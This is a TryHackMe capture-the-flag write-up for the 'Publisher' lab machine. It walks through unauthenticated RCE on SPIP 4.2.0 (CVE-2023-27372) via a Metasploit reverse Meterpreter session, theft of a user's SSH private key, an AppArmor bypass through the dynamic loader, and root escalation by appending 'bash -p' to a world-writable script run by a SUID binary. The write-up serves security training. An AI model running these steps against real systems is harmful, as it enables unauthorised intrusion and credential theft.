# Publisher — TryHackMe Writeup

**TL;DR:** SPIP 4.2.0 unauthenticated RCE (CVE-2023-27372) → www-data shell → recover SSH key for `think` → SUID `/usr/sbin/run_container` + writable `/opt/run_container.sh` → dynamic loader trick → root shell in container.

## Target
- Machine: publisher.thm
- Date: 2025-8-13
- Environment: TryHackMe / educational lab

## Tools
`nmap`, `gobuster`, `searchsploit`, `msfconsole`, `ssh`, `curl`

## Steps 
1. Initial scan:

```bash

└─$ nmap -sV -sC -T4 -Pn -p- publisher.thm   

Output: 

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
2. Directory discovery:

```bash
└─$ gobuster dir -u http://publisher.thm/ -w /usr/share/wordlists/dirb/big.txt -t 40

/images
/spip
```
SPIP :
SPIP (Spark Project Improvement Proposals), a document for significant changes in the Spark software project; a free open-source publishing system for websites

Directory discovery for /spip :

  ```bash
└─$ gobuster dir -u http://publisher.thm/spip/ -w /usr/share/wordlists/dirb/big.txt -t 40


/local                (Status: 301) [Size: 317] [--> http://publisher.thm/spip/local/]
/vendor               (Status: 301) [Size: 318] [--> http://publisher.thm/spip/vendor/]
/config               (Status: 301) [Size: 318] [--> http://publisher.thm/spip/config/]
```
there are a config.txt file in /local :

http://publisher.thm/spip/local/config.txt

--------------------
we got the version of spip :

spip(4.2.0)
===================================================================

3. Find exploit:
```bash
└─$ searchsploit spip 4.2.0 

SPIP v4.2.0 - Remote Code Execution (Unauthenticated)       | php/webapps/51536.py

```

===================================================================

## CVE-2023-27372

 SPIP before 4.2.1 allows Remote Code Execution via form values in the public area because serialization is mishandled. Branches 3.2, 4.0, 4.1 and 4.2 are concerned. The fixed versions are 3.2.18, 4.0.10, 4.1.8, and 4.2.1.
 This PoC exploits a PHP code injection in SPIP. The vulnerability exists in the `oubli` parameter and allows an unauthenticated user to execute arbitrary commands with web user privileges.

===================================================================

4. Example Metasploit run :
```bash
msf exploit(multi/http/spip_bigup_unauth_rce) > set LHOST [Your IP]
LHOST => [IP]
msf exploit(multi/http/spip_bigup_unauth_rce) > set RHOST [Target IP]
RHOST => [IP]
msf exploit(multi/http/spip_bigup_unauth_rce) > set TARGETURI /spip/
TARGETURI => /spip/
msf exploit(multi/http/spip_bigup_unauth_rce) > run


[+] SPIP version 4.2.0 is vulnerable.
[+] The target appears to be vulnerable. Both the detected SPIP version (4.2.0) and bigup version (3.2.1) are vulnerable.
[*] Meterpreter session 1 opened (LHOST:4444 -> RHOST:52354) at 2025-8-13 08:58:31 +0300
```

--------------------

5.get shell and recover SSH key for `think` user

```bash
meterpreter > shell

id      
uid=33(www-data) gid=33(www-data) groups=33(www-data)

cat /home/think/.ssh/id_rsa
```
---------------------
## USER-FLAG

copy the id_rsa for `think` user and past it in new file
```bash
└─$ echo '[REDACTED]' > id_rsa_think
└─$ chmod 600 id_rsa_think
└─$ ssh -i id_rsa_think think@publisher.thm

think@publisher.thm:~$ id
uid=1000(think) gid=1000(think) groups=1000(think)

think@publisher.thm:~$ cat user.txt
[REDACTED]
```
--------------------

## ROOT-FLAG

Look to the App Armor by it's profile.


AppArmor is a Linux kernel security module that restricts applications' capabilities using per-program security profiles

---------
```bash
think@publisher.thm:~$ find / -perm -4000 2>/dev/null 

/usr/sbin/run_container

think@publisher.thm:~$ ls -la /usr/sbin/run_container
-rwsr-sr-x 1 root root 16760 Nov 14  2023 /usr/sbin/run_container
```
-------
run_container 
an application to easily manage the containers

---------
let's see what its use 
```bash
think@publisher.thm:~$ strings /usr/sbin/run_container 

/bin/bash
/opt/run_container.sh

```
here, its use bash script in /opt/
```bash
think@publisher.thm:~$ ls -la /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
```
-------
its script owned by root
we can write and read and execute it.
So we gonna add a command to get sudo bash
```bash
think@publisher.thm:/$ cd /opt/
think@publisher.thm:/opt$ ls -la
ls: cannot open directory '.': Permission denied
think@publisher.thm:/opt$ echo 'bash -p' > run_container.sh
-ash: run_container.sh: Permission denied
```
---------
we can see the shell of the user think its ash not bash
its limited shell
I have used a kernel library to spawn an unconfined bash shell:

--------------
```bash
think@publisher.thm:~$ /lib/x86_64-linux-gnu/ld-2.31.so /bin/bash
think@publisher.thm:/opt$ ls -la
total 20
drwxr-xr-x  3 root root 4096 Jan 10  2024 .
drwxr-xr-x 18 root root 4096 Oct  6 17:14 ..
drwx--x--x  4 root root 4096 Nov 14  2023 containerd
-rw-r--r--  1 root root  861 Dec  7  2023 dockerfile
-rwxrwxrwx  1 root root 1715 Jan 10  2024 run_container.sh
```
---------
Now we can write and edit it. 
```bash
think@publisher.thm:/opt$ echo 'bash -p' >> run_container.sh
think@publisher.thm:/opt$ run_container
List of Docker containers:
ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 2 hours

Enter the ID of the container or leave blank to create a new one: 
/opt/run_container.sh: line 16: validate_container_id: command not found

OPTIONS:
1) Start Container    3) Restart Container  5) Quit
2) Stop Container     4) Create Container
Choose an action for a container: 1
Error response from daemon: page not found
Error: failed to start containers: 
bash-5.0# id
uid=1000(think) gid=1000(think) euid=0(root) egid=0(root) groups=0(root),1000(think)
bash-5.0# cat /root/root.txt
[REDACTED]
```
